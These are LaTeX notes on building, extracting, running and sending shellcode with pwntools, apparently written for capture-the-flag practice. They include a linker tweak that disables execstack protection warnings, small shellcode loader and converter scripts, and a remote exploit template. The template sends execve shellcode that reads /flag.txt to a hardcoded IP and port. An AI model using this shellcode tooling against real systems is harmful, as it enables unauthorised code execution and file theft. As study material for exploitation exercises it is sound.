\section{shellcode with pwntools}

\url{https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html}

\href{https://github.com/Gallopsled/pwntools-tutorial#readme}{pwntools-tutorial}

\verb+ld+ seems to have new by default protection regarding building elf from
shellcode.
add the following options  in
\verb+/usr/lib/python3.10/site-packages/pwnlib/asm.py+ to bypass that
\begin{verbatim}
linker_options = ['-z', 'execstack', '--no-warn-rwx-segments', '--no-warn-execstack']
\end{verbatim}

\subsection{Extract Shellcode from an elf binary}
\begin{verbatim}
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())
\end{verbatim}

\subsection{load and run shellcode}

\begin{verbatim}
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
\end{verbatim}


\subsection{Shellcode to binary}


\begin{verbatim}
#!/usr/bin/python3

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
\end{verbatim}


\subsection{Remote binary exploit}
generate a template like :
\begin{verbatim}
$ pwntools-pwn template --host 159.65.63.151 --port 30138
\end{verbatim}

and edit the template to send / recv data from the target

\begin{verbatim}
io = start()
#gen = cyclic_gen()
#payload = gen.get(2000)
syscall = shellcraft.execve(path='/bin/cat',argv=['/bin/cat', '/flag.txt'])
print(syscall)
payload = asm(syscall).hex()
io.send(payload)
flag = io.recvline()
log.success(flag)

io.interactive()
\end{verbatim}



